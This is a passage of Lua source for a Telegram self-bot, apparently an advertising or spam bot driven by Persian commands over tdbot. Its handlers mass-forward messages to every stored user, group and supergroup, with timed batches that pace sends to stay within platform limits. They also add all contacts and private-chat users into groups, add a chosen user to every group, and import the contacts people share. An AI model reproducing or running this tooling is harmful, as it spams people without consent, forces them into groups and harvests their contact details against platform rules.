					local links = redis:scard("botBOT-IDsavedlinks")
					local glinks = redis:scard("botBOT-IDgoodlinks")
					local wlinks = redis:scard("botBOT-IDwaitelinks")
					assert ( tdbot_function({
						_ = "searchContacts",
						query = nil,
						limit = 999999999
					}, function (i, naji)
					redis:set("botBOT-IDcontacts", naji.total_count)
					end, nil))
					local contacts = redis:get("botBOT-IDcontacts")
					local text = [[
📈 وضعیت و آمار تبلیغ گر 📊
          
👤 گفت و گو های شخصی : 
]] .. tostring(usrs) .. [[

👥 گروها :
]] .. tostring(gps) .. [[

🌐 سوپر گروه ها :
]] .. tostring(sgps) .. [[

📖 مخاطبین دخیره شده : 
]] .. tostring(contacts)..[[

📂 لینک های ذخیره شده :
]] .. tostring(links)
					return send(msg.chat_id, 0, text)
				elseif (text:match("^(ارسال به) (.*)$") and msg.reply_to_message_id ~= 0) then
					local matches = text:match("^ارسال به (.*)$")
					local naji
					if matches:match("^(همه)") then
						naji = "botBOT-IDall"
					elseif matches:match("^(خصوصی)") then
						naji = "botBOT-IDusers"
					elseif matches:match("^(گروه)$") then
						naji = "botBOT-IDgroups"
					elseif matches:match("^(سوپرگروه)$") then
						naji = "botBOT-IDsupergroups"
					else
						return true
					end
					local list = redis:smembers(naji)
					local id = msg.reply_to_message_id
					if redis:get("botBOT-IDfwdtime") then
						local max_i = redis:get("botBOT-IDsendmax") or 5
						local delay = redis:get("botBOT-IDsenddelay") or 2
						local during = (#list / tonumber(max_i)) * tonumber(delay)
						send(msg.chat_id, msg.id, "اتمام عملیات در "..during.."ثانیه بعد\nراه اندازی مجدد ربات در "..redis:ttl("botBOT-IDstart").."ثانیه اینده")
						redis:setex("botBOT-IDdelay", math.ceil(tonumber(during)), true)
							assert ( tdbot_function({
								_ = "forwardMessages",
								chat_id = tonumber(list[1]),
								from_chat_id = msg.chat_id,
								message_ids = {[0] = id},
								disable_notification = 1,
								from_background = 1
							}, forwarding, {list=list, max_i=max_i, delay=delay, n=1, all=#list, chat_id=msg.chat_id, msg_id=id, s=0}))
					else
						for i, v in pairs(list) do
							assert (tdbot_function({
								_ = "forwardMessages",
								chat_id = tonumber(v),
								from_chat_id = msg.chat_id,
								message_ids = {[0] = id},
								disable_notification = 1,
								from_background = 1
							}, dl_cb, nil))
						end
						return send(msg.chat_id, msg.id, "با موفقیت فرستاده شد")
					end
				elseif text:match("^(ارسال زمانی) (.*)$") then
					local matches = text:match("^ارسال زمانی (.*)$")
					if matches == "روشن" then
						redis:set("botBOT-IDfwdtime", true)
						return send(msg.chat_id,msg.id,"زمان بندی ارسال فعال شد.")
					elseif matches == "خاموش" then
						redis:del("botBOT-IDfwdtime")
						return send(msg.chat_id,msg.id,"زمان بندی ارسال غیر فعال شد.")
					end
				elseif text:match("^(تنظیم تعداد) (%d+)$") then
					local matches = text:match("%d+")
					redis:set("botBOT-IDsendmax", tonumber(matches))
					return send(msg.chat_id,msg.id,"تعداد گروه ها بین وقفه های زمانی ارسال تنظیم شد به "..matches)
				elseif text:match("^(تنظیم وقفه) (%d+)$") then
					local matches = text:match("%d+")
					redis:set("botBOT-IDsenddelay", tonumber(matches))
					return send(msg.chat_id,msg.id,"زمان وقفه بین ارسال ها تنظیم شد به "..matches)
				elseif text:match("^(ارسال به سوپرگروه) (.*)") then
					local matches = text:match("^ارسال به سوپرگروه (.*)")
					local dir = redis:smembers("botBOT-IDsupergroups")
					local max_i = redis:get("botBOT-IDsendmax") or 5
					local delay = redis:get("botBOT-IDsenddelay") or 2
					local during = (#dir / tonumber(max_i)) * tonumber(delay)
					send(msg.chat_id, msg.id, "اتمام عملیات در "..during.."ثانیه بعد\nراه اندازی مجدد ربات در "..redis:ttl("botBOT-IDstart").."ثانیه اینده")
					redis:setex("botBOT-IDdelay", math.ceil(tonumber(during)), true)
					assert (tdbot_function ({
						_ = 'sendMessage',
						chat_id = tonumber(dir[1]),
						reply_to_message_id = msg.id,
						disable_notification = 0,
						from_background = 1,
						reply_markup=nil,
						input_message_content={
							_="inputMessageText",
							text= tostring(matches),
							disable_web_page_preview=true,
							clear_draft=false,
							entities={},
							parse_mode=nil}
					}, sending, {list=dir, max_i=max_i, delay=delay, n=1, all=#dir, chat_id=msg.chat_id, text=matches, s=0}))
				elseif text:match("^(مسدودیت) (%d+)$") then
					local matches = text:match("%d+")
					rem(tonumber(matches))
					redis:sadd("botBOT-IDblockedusers",matches)
					assert (tdbot_function ({
						_ = "blockUser",
						user_id = tonumber(matches)
					}, dl_cb, nil))
					return send(msg.chat_id, msg.id, "کاربر مورد نظر مسدود شد")
				elseif text:match("^(رفع مسدودیت) (%d+)$") then
					local matches = text:match("%d+")
					add(tonumber(matches))
					redis:srem("botBOT-IDblockedusers",matches)
					assert (tdbot_function ({
						_ = "unblockUser",
						user_id = tonumber(matches)
					}, dl_cb, nil))
					return send(msg.chat_id, msg.id, "<i>مسدودیت کاربر مورد نظر رفع شد.</i>")	
				elseif text:match('^(تنظیم نام) "(.*)" (.*)') then
					local fname, lname = text:match('^تنظیم نام "(.*)" (.*)')
					assert (tdbot_function ({
						_ = "changeName",
						first_name = fname,
						last_name = lname
					}, dl_cb, nil))
					return send(msg.chat_id, msg.id, "نام جدید با موفقیت ثبت شد.")
				elseif text:match("^(تنظیم نام کاربری) (.*)") then
					local matches = text:match("^تنظیم نام کاربری (.*)")
						assert (tdbot_function ({
						_ = "changeUsername",
						username = tostring(matches)
						}, dl_cb, nil))
					return send(msg.chat_id, 0, 'تلاش برای تنظیم نام کاربری...')
				elseif text:match("^(حذف نام کاربری)$") then
					assert (tdbot_function ({
						_ = "changeUsername",
						username = ""
					}, dl_cb, nil))
					return send(msg.chat_id, 0, 'نام کاربری با موفقیت حذف شد.')
				elseif text:match('^(ارسال کن) "(.*)" (.*)') then
					local id, txt = text:match('^ارسال کن "(.*)" (.*)')
					send(id, 0, txt)
					return send(msg.chat_id, msg.id, "ارسال شد")
				elseif text:match("^(بگو) (.*)") then
					local matches = text:match("^بگو (.*)")
					return send(msg.chat_id, 0, matches)
				elseif text:match("^(شناسه من)$") then
					return send(msg.chat_id, msg.id, msg.sender_user_id)
				elseif text:match("^(ترک کردن) (.*)$") then
					local matches = text:match("^ترک کردن (.*)$")
					if matches == 'همه' then
						for i,v in pairs(redis:smembers("botBOT-IDsupergroups")) do
							assert (tdbot_function ({
								_ = "changeChatMemberStatus",
								chat_id = tonumber(v),
								user_id = bot_id,
								status = {_ = "chatMemberStatusLeft"},
							}, dl_cb, nil))
						end
					else
						send(msg.chat_id, msg.id, 'تبلیغ‌گر از گروه مورد نظر خارج شد')
						assert (tdbot_function ({
							_ = "changeChatMemberStatus",
							chat_id = matches,
							user_id = bot_id,
							status = {_ = "chatMemberStatusLeft"},
						}, dl_cb, nil))
						return rem(matches)
					end
				elseif text:match("^(افزودن به همه) @(.*)$") then
					local matches = text:match("^افزودن به همه @(.*)$")
					local list = {redis:smembers("botBOT-IDgroups"), redis:smembers("botBOT-IDsupergroups")}
					local l = {}
					for a, b in pairs(list) do
						for i, v in pairs(b) do 
							table.insert(l, v)
						end
					end
					local max_i = redis:get("botBOT-IDsendmax") or 5
					local delay = redis:get("botBOT-IDsenddelay") or 2
					if #l == 0 then
						return
					end
					local during = (#l / tonumber(max_i)) * tonumber(delay)
					send(msg.chat_id, msg.id, "اتمام عملیات در "..during.."ثانیه بعد\nراه اندازی مجدد ربات در "..redis:ttl("botBOT-IDstart").."ثانیه اینده")
					redis:setex("botBOT-IDdelay", math.ceil(tonumber(during)), true)
					print(#l)
					assert (tdbot_function ({
						_ = "searchPublicChat",
						username = matches
						}, function(I, naji)
								if naji.id then
									tdbot_function ({
									_ = "addChatMember",
									chat_id = tonumber(I.list[tonumber(I.n)]),
									user_id = naji.id,
									forward_limit =  0
								},adding {list=I.list, max_i=I.max_i, delay=I.delay, n=tonumber(I.n), all=I.all, chat_id=I.chat_id, user_id=I.user_id, s=I.s})
								end
							end
						, {list=l, max_i=max_i, delay=delay, n=1, all=#l, chat_id=msg.chat_id, user_id=matches, s=0}))
				elseif (text:match("^(انلاین)$") and not msg.forward_info)then
					return assert (tdbot_function({
						_ = "forwardMessages",
						chat_id = msg.chat_id,
						from_chat_id = msg.chat_id,
						message_ids = {[0] = msg.id},
						disable_notification = 0,
						from_background = 1
					}, dl_cb, nil))
				elseif text:match("^(راهنما)$") then
					local txt = '📍راهنمای دستورات تبلیغ‌گر📍\n\nانلاین\n<i>اعلام وضعیت تبلیغ‌گر ✔️</i>\n<code>❤️ حتی اگر تبلیغ‌گر شما دچار محدودیت ارسال پیام شده باشد بایستی به این پیام پاسخ دهد❤️</code>\n\nافزودن مدیر شناسه\n<i>افزودن مدیر جدید با شناسه عددی داده شده 🛂</i>\n\nافزودن مدیرکل شناسه\n<i>افزودن مدیرکل جدید با شناسه عددی داده شده 🛂</i>\n\n<code>(⚠️ تفاوت مدیر و مدیر‌کل دسترسی به اعطا و یا گرفتن مقام مدیریت است⚠️)</code>\n\nحذف مدیر شناسه\n<i>حذف مدیر یا مدیرکل با شناسه عددی داده شده ✖️</i>\n\nترک گروه\n<i>خارج شدن از گروه و حذف آن از اطلاعات گروه ها 🏃</i>\n\nافزودن همه مخاطبین\n<i>افزودن حداکثر مخاطبین و افراد در گفت و گوهای شخصی به گروه ➕</i>\n\nشناسه من\n<i>دریافت شناسه خود 🆔</i>\n\nبگو متن\n<i>دریافت متن 🗣</i>\n\nارسال کن "شناسه" متن\n<i>ارسال متن به شناسه گروه یا کاربر داده شده 📤</i>\n\nتنظیم نام "نام" فامیل\n<i>تنظیم نام ربات ✏️</i>\n\nتازه سازی ربات\n<i>تازه‌سازی اطلاعات فردی ربات🎈</i>\n<code>(مورد استفاده در مواردی همچون پس از تنظیم نام📍جهت بروزکردن نام مخاطب اشتراکی تبلیغ‌گر📍)</code>\n\nتنظیم نام کاربری اسم\n<i>جایگزینی اسم با نام کاربری فعلی(محدود در بازه زمانی کوتاه) 🔄</i>\n\nحذف نام کاربری\n<i>حذف کردن نام کاربری ❎</i>\n\nتوقف عضویت|تایید لینک|شناسایی لینک|افزودن مخاطب\n<i>غیر‌فعال کردن فرایند خواسته شده</i> ◼️\n\nشروع عضویت|تایید لینک|شناسایی لینک|افزودن مخاطب\n<i>فعال‌سازی فرایند خواسته شده</i> ◻️\n\nحداکثر گروه عدد\n<i>تنظیم حداکثر سوپرگروه‌هایی که تبلیغ‌گر عضو می‌شود،با عدد دلخواه</i> ⬆️\n\nحداقل اعضا عدد\n<i>تنظیم شرط حدقلی اعضای گروه برای عضویت,با عدد دلخواه</i> ⬇️\n\nحذف حداکثر گروه\n<i>نادیده گرفتن حدمجاز تعداد گروه</i> ➰\n\nحذف حداقل اعضا\n<i>نادیده گرفتن شرط حداقل اعضای گروه</i> ⚜️\n\nارسال زمانی روشن|خاموش\n<i>زمان بندی در فروارد و ارسال و افزودن به گروه و استفاده در دستور ارسال</i> ⏲\n\nتنظیم تعداد عدد\n<i>تنظیم گروه های میان وقفه در ارسال زمانی</i>\n\nتنظیم وقفه عدد\n<i>تنظیم وقفه به ثانیه در عملیات زمانی</i>\n\nافزودن با شماره روشن|خاموش\n<i>تغییر وضعیت اشتراک شماره تبلیغ‌گر در جواب شماره به اشتراک گذاشته شده 🔖</i>\n\nافزودن با پیام روشن|خاموش\n<i>تغییر وضعیت ارسال پیام در جواب شماره به اشتراک گذاشته شده ℹ️</i>\n\nتنظیم پیام افزودن مخاطب متن\n<i>تنظیم متن داده شده به عنوان جواب شماره به اشتراک گذاشته شده 📨</i>\n\nلیست مخاطبین|خصوصی|گروه|سوپرگروه|پاسخ های خودکار|لینک|مدیر\n<i>دریافت لیستی از مورد خواسته شده در قالب پرونده متنی یا پیام 📄</i>\n\nمسدودیت شناسه\n<i>مسدود‌کردن(بلاک) کاربر با شناسه داده شده از گفت و گوی خصوصی 🚫</i>\n\nرفع مسدودیت شناسه\n<i>رفع مسدودیت کاربر با شناسه داده شده 💢</i>\n\nوضعیت مشاهده روشن|خاموش 👁\n<i>تغییر وضعیت مشاهده پیام‌ها توسط تبلیغ‌گر (فعال و غیر‌فعال‌کردن تیک دوم)</i>\n\nامار\n<i>دریافت آمار و وضعیت تبلیغ‌گر 📊</i>\n\nوضعیت\n<i>دریافت وضعیت اجرایی تبلیغ‌گر⚙️</i>\n\nتازه سازی\n<i>تازه‌سازی آمار تبلیغ‌گر🚀</i>\n<code>🎃مورد استفاده حداکثر یک بار در روز🎃</code>\n\nارسال به همه|خصوصی|گروه|سوپرگروه\n<i>ارسال پیام جواب داده شده به مورد خواسته شده 📩</i>\n<code>(😄توصیه ما عدم استفاده از همه و خصوصی😄)</code>\n\nارسال به سوپرگروه متن\n<i>ارسال متن داده شده به همه سوپرگروه ها ✉️</i>\n<code>(😜توصیه ما استفاده و ادغام دستورات بگو و ارسال به سوپرگروه😜)</code>\n\nتنظیم جواب "متن" جواب\n<i>تنظیم جوابی به عنوان پاسخ خودکار به پیام وارد شده مطابق با متن باشد 📝</i>\n\nحذف جواب متن\n<i>حذف جواب مربوط به متن ✖️</i>\n\nپاسخگوی خودکار روشن|خاموش\n<i>تغییر وضعیت پاسخگویی خودکار تبلیغ‌گر به متن های تنظیم شده 📯</i>\n\nحذف لینک عضویت|تایید|ذخیره شده\n<i>حذف لیست لینک‌های مورد نظر </i>❌\n\nحذف کلی لینک عضویت|تایید|ذخیره شده\n<i>حذف کلی لیست لینک‌های مورد نظر </i>💢\n🔺<code>پذیرفتن مجدد لینک در صورت حذف کلی</code>🔻\n\nاستارت یوزرنیم\n<i>استارت زدن ربات با یوزرنیم وارد شده</i>\n\nافزودن به همه یوزرنیم\n<i>افزودن کابر با یوزرنیم وارد شده به همه گروه و سوپرگروه ها ➕➕</i>\n\nگروه عضویت باز روشن|خاموش\n<i>عضویت در گروه ها با شرایط توانایی تبلیغ‌گر به افزودن عضو</i>\n\nترک کردن شناسه\n<i>عملیات ترک کردن با استفاده از شناسه گروه 🏃</i>\n\nراهنما\n<i>دریافت همین پیام 🆘</i>\n〰〰〰ا〰〰〰\nسازنده : 					\nکانال : \n<code>آخرین اخبار و رویداد های تبلیغ‌گر را در کانال ما پیگیری کنید.</code>'
					return send(msg.chat_id,msg.id, txt, {_ = 'textParseModeHTML'})
				elseif tostring(msg.chat_id):match("^-") then
					if text:match("^(ترک کردن)$") then
						rem(msg.chat_id)
						return assert (tdbot_function ({
							_ = "changeChatMemberStatus",
							chat_id = msg.chat_id,
							user_id = tonumber(bot_id),
							status = {_ = "chatMemberStatusLeft"},
						}, dl_cb, nil))
					elseif text:match("^(افزودن همه مخاطبین)$") then
						send(msg.chat_id, msg.id, "در حال افزودن مخاطبین به گروه ...")
						assert (tdbot_function({
							_ = "searchContacts",
							query = nil,
							limit = 999999999
						},function(i, naji)
							local users, count = redis:smembers("botBOT-IDusers"), naji.total_count
							for n=0, tonumber(count) - 1 do
								assert (tdbot_function ({
									_ = "addChatMember",
									chat_id = tonumber(i.chat_id),
									user_id = naji.users[n].id,
									forward_limit = 50
								},  dl_cb, nil))
							end
							for n=1, #users do
								assert (tdbot_function ({
									_ = "addChatMember",
									chat_id = tonumber(i.chat_id),
									user_id = tonumber(users[n]),
									forward_limit = 50
								},  dl_cb, nil))
							end
						end, {chat_id=msg.chat_id}))
						return 
					end
				end
			end
			if redis:sismember("botBOT-IDanswerslist", text) then
				if redis:get("botBOT-IDautoanswer") then
					if msg.sender_user_id ~= bot_id then
						local answer = redis:hget("botBOT-IDanswers", text)
						send(msg.chat_id, 0, answer)
					end
				end
			end
		elseif (msg.content._ == "messageContact" and redis:get("botBOT-IDsavecontacts")) then
			local id = msg.content.contact.user_id
			if not redis:sismember("botBOT-IDaddedcontacts",id) then
				redis:sadd("botBOT-IDaddedcontacts",id)
				local first = msg.content.contact.first_name or "-"
				local last = msg.content.contact.last_name or "-"
				local phone = msg.content.contact.phone_number
				local id = msg.content.contact.user_id
				assert (tdbot_function ({
					_ = "importContacts",
					contacts_ = {[0] = {
							phone_number = tostring(phone),
							first_name = tostring(first),
							last_name = tostring(last),
							user_id = id
						},
					},
				}, dl_cb, nil))
				if redis:get("botBOT-IDaddcontact") and msg.sender_user_id ~= bot_id then
					local fname = redis:get("botBOT-IDfname")
					local lname = redis:get("botBOT-IDlname") or ""
					local num = redis:get("botBOT-IDnum")
					assert (tdbot_function ({
						_ = "sendMessage",
						chat_id = msg.chat_id,
						reply_to_message_id = msg.id,
						disable_notification = 1,
						from_background = 1,
						reply_markup = nil,
						input_message_content = {
							_ = "inputMessageContact",
							contact = {
								_ = "contact",
								phone_number = num,
								first_name = fname,
								last_name = lname,
								user_id = bot_id
							},
						},
					}, dl_cb, nil))
				end
			end
			if redis:get("botBOT-IDaddmsg") then
				local answer = redis:get("botBOT-IDaddmsgtext") or "اددی گلم خصوصی پیام بده"
				send(msg.chat_id, msg.id, answer)
			end
		elseif msg.content._ == "messageChatDeleteMember" and msg.content.id == bot_id then
			return rem(msg.chat_id)
		elseif (msg.content.caption and redis:get("botBOT-IDlink"))then
			find_link(msg.content.caption)
		end
		if redis:get("botBOT-IDmarkread") then
			assert (tdbot_function ({
				_ = "viewMessages",
				chat_id = msg.chat_id,
				message_ids = {[0] = msg.id} 
			}, dl_cb, nil))
		end
	end
end
